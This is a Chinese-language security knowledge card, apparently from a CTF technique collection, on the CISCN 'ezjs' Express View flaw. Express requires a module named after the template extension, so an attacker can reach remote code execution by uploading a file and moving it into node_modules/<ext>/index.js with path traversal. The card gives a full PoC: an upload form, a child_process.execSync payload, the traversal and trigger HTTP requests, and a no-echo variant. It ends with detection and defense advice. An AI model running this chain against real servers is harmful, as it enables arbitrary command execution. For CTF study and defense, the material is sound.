---
id: web-nodejs-express-view-ext-require-node-modules-rce
title: Express View 按扩展名 require 任意模块：rename 穿越写 node_modules/<ext>/index.js 触发 require 执行（CISCN ezjs）
type: scenario
domain: web
path: web/nodejs
technique: express-view-engine-require-module-rce
aliases:
- Express View require 任意模块
- res.render 扩展名 require RCE
- node_modules/<ext>/index.js 写入执行
- CISCN ezjs
- __express 命令执行
tags:
- nodejs
- express
- ejs
- require
- path-traversal
- file-write
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V295
  verified_at: '2026-11-08T08:20:30+08:00'
  notes: 已完整读 content.md 与全部23张图核对：图05 View构造函数 this.ext=extname(name)→mod=this.ext.slice(1)→require(mod).__express；图06报错Cannot find module 'aaa'；图07 rename payload oldPath=1.aaa&newPath=../node_modules/aaa/index.js；图08 node_modules/aaa/index.js落地；图09/10 require成功并赋值engines[this.ext]；图11 View.prototype.render→this.engine(this.path,...)；图12 dir命令回显；图13无回显变体顶层execSync+writeFileSync；图01/02上传fileInput表单。卡内rename正则(app\.js|\|\.ejs；oldPath \.\.|flag)、path.join归一化、require模块解析、__express与顶层立即执行两变体均与原文一致。单卡原子(Express View扩展名→require任意模块)，粒度合适。dedup最高分为卡自身exact自匹配；与同文EJS extname卡(cos约0.9046)、Express PUT模板名卡、JWT弱密钥EJS卡等为不同分支/入口，dup-scan verdict=related，裁决并列保留；其余related不同链。无组件版本，未set-versions。未验证点：未在本地复跑Node环境。
---

## 一句话结论

Express 的 `View` 构造函数在遇到未知模板扩展名时执行 `var mod = this.ext.slice(1); var fn = require(mod).__express`，即按「扩展名→模块名」直接 `require`；只要攻击者能把恶意 `index.js` 写进 `node_modules/<ext>/`（例如经上传 + rename 路径穿越），一次 `res.render(用户可控路径.aaa)` 就会让 Node 加载并执行该模块，再经 `__express`/`View.render` 触发命令执行。

## 原理

- Express 渲染链路：`res.render(view)` → `app.render(view)` → `new View(name, { defaultEngine, root, engines })` → `View` 构造函数决定引擎。关键代码：

  ```js
  function View(name, options) {
      this.defaultEngine = options.defaultEngine;
      this.ext = extname(name);
      this.name = name;
      ...
      var fileName = name;
      if (!this.ext) {
          this.ext = this.defaultEngine[0] !== '.' ? '.' + this.defaultEngine : this.defaultEngine;
          fileName += this.ext;
      }
      if (!options.engines[this.ext]) {
          var mod = this.ext.slice(1);      // .aaa -> aaa
          var fn = require(mod).__express;  // 关键：按扩展名 require 模块
          ...
          options.engines[this.ext] = fn;
      }
      this.engine = options.engines[this.ext];
      this.path = this.lookup(fileName);
  }
  ```

  `extname(name)` 取到最后一段后缀（如 `.aaa`），去掉点得到 `mod=aaa`，随后 `require('aaa')`。Node 的 CommonJS 解析会在应用的 `node_modules/aaa/` 下找 `package.json` 的 `main` 或 `index.js`；找到后**立即执行模块顶层代码**，再取 `__express` 作为渲染引擎。
- 因此攻击链需要两件事同时成立：
  1. 应用把用户可控的路径传给 `res.render`（例如 `/render?filename=1.aaa` 用 `path.join(__dirname,'uploads',filename)` 后 `res.render(filePath)`），从而让 `ext` 由攻击者选择；
  2. 攻击者能在 `node_modules/<ext>/` 下写文件。CISCN ezjs 用「上传 + rename 路径穿越」实现：上传 `1.aaa`（内容是恶意 JS），再请求
  
     ```
     GET /rename?oldPath=1.aaa&newPath=../node_modules/aaa/index.js
     ```
     
     `rename` 路由对 `newPath` 只黑名单 `/app\.js|\\|\.ejs/i`（不拦 `..`），对 `oldPath` 只拦 `/\.\.|flag/i`；`path.join(__dirname,'uploads','../node_modules/aaa/index.js')` 归一化到应用根的 `node_modules/aaa/index.js`，`fs.rename` 把上传文件搬过去，`createDirectoriesForFilePath` 还会自动建目录。
- 触发方式有两种：
  - **`__express` 延迟执行**：文件内容为 `exports.__express = function(){ console.log(require('child_process').execSync("dir").toString()) }`。`require('aaa')` 只注册函数，随后 `View.render` 调用 `this.engine(this.path, options, callback)`，即执行该 `__express`。
  - **require 顶层立即执行（无回显变体）**：文件内容直接写顶层代码，如 `const {execSync}=require('child_process'); const fs=require('fs'); fs.writeFileSync('output.txt', execSync('dir').toString());`。`require` 加载模块时即执行，适合把结果写到 Web 可访问目录再读取；文章指出该变体无回显。
- 为什么 `require` 能解析到刚写的目录：Node 从当前模块（express/lib/view.js）向上查找 `node_modules`，应用根的 `node_modules` 在查找路径上；`aaa/index.js` 是默认入口，不需要 `package.json`。
- 该原语的本质是「把不可信的模板扩展名当作模块名」，与模板引擎本身无关：Pug、Handlebars 等任何被 `require` 的引擎名都同理；只要扩展名可控且能在对应 `node_modules/<name>/` 落文件，就能执行任意 JS。

## 触发条件

- Express 应用存在 `res.render()` 接受用户可控路径/模板名（至少扩展名可控）的路由。
- 应用同时存在任意文件写入/上传 + 可穿越的重命名、解压、日志写入等能力，能把文件落到 `node_modules/<ext>/index.js`（或 `package.json` 指向的文件）。
- Node 进程对 `node_modules` 有写权限（部署时通常有，尤其开发/容器环境）。
- 目标扩展名未在 `options.engines` 中注册（否则走已注册引擎，不会 require 新模块）。
- 上传/写入内容不被查杀，且 `require` 缓存未命中（首次加载）。

## 利用步骤

1. 找到把用户输入传给 `res.render` 的路由，确认文件名/扩展名可控；例如 `/render?filename=1.aaa`。
2. 通过上传接口传一个扩展名为 `.aaa` 的文件，内容先放最小验证代码（`exports.__express = function(){ console.log('PWNED') }` 或顶层写文件）。
3. 找到能把上传文件移动到 `node_modules/aaa/index.js` 的写入/重命名/解压原语。CISCN ezjs 的 rename 路由允许 `newPath` 含 `..`：
   `GET /rename?oldPath=1.aaa&newPath=../node_modules/aaa/index.js`。
4. 再次请求 `/render?filename=1.aaa`。若用 `__express` 变体，命令在渲染阶段执行；若用顶层代码变体，命令在 `require` 阶段执行。
5. 无回显时把命令输出写到 Web 可访问目录（如 `uploads/` 或静态目录）再访问；有回显时可直接 `execSync('id')` 输出到响应。
6. 注意 rename 后 `uploads/1.aaa` 已被移走，若 `View.lookup` 要求原文件存在，需要重新上传一份 `1.aaa` 或保留副本；文章实测需补回该文件，否则 render 会在 lookup 阶段报错。

## PoC

上传（HTML 表单，文件字段名必须是 `fileInput`）：

```html
<form action="http://127.0.0.1:3000/upload" method="post" enctype="multipart/form-data">
  <input type="file" name="fileInput">
  <input type="submit" value="提交">
</form>
```

文件 `1.aaa` 内容（延迟执行变体）：

```js
exports.__express = function () {
    console.log(require('child_process').execSync("dir").toString());
}
```

rename 穿越：

```http
GET /rename?oldPath=1.aaa&newPath=../node_modules/aaa/index.js HTTP/1.1
Host: 127.0.0.1:3000
```

触发：

```http
GET /render?filename=1.aaa HTTP/1.1
Host: 127.0.0.1:3000
```

`require('aaa')` 命中 `node_modules/aaa/index.js`，`View.render` 调用 `__express`，命令输出回显到响应。无回显变体把 `index.js` 顶层写成 `fs.writeFileSync('output.txt', execSync('dir').toString())`，再访问写出的文件。

## 变体与关联

- 写入方式变体：rename 路径穿越、任意上传、Zip Slip 解压、模板/日志写入；只要能控制 `node_modules/<ext>/` 下的文件即可。
- 引擎变体：扩展名换成 `pug`、`handlebars` 等，require 对应模块目录；若目标已有同名模块，可覆盖其 `index.js`（需写权限）。
- 关联：`web/nodejs/ssti` 下「Express PUT 任意文件写入 + res.render(templ) 模板名可控」是另一条链（直接渲染攻击者模板）；本卡是「扩展名→require 模块」而非模板内容注入。
- 关联：同文章另一张 EJS 卡利用 `extname('.ejs')===''` 与 View 默认引擎补全，绕过上传/渲染的后缀检查；两者都源于 Express View 的扩展名/默认引擎逻辑。

## 检测与防御

- 修复：不要用用户输入构造 `res.render` 的路径/模板名；模板名走白名单枚举，扩展名限定已注册引擎。
- 文件系统：`node_modules` 只读（容器只读根、部署后 chmod），禁止 Web 进程写入；rename/上传/解压接口做 `path.resolve` 前缀校验，拒绝 `..`。
- 运行：生产环境不要以开发模式/可写目录部署；Node 进程最小权限；启用完整性监控（node_modules 文件哈希）。
- 检测：监控 `node_modules` 下新增/修改的 `index.js`、`package.json`；审计 `res.render` 参数含用户输入的路由；监控上传后紧接 rename 到 `node_modules` 的请求序列；对 `require()` 加载非预期模块的报错（如 `Cannot find module 'aaa'`）告警。
- 排查：检查 `node_modules` 中异常的模块目录与文件时间戳，核对上传/rename 访问日志。
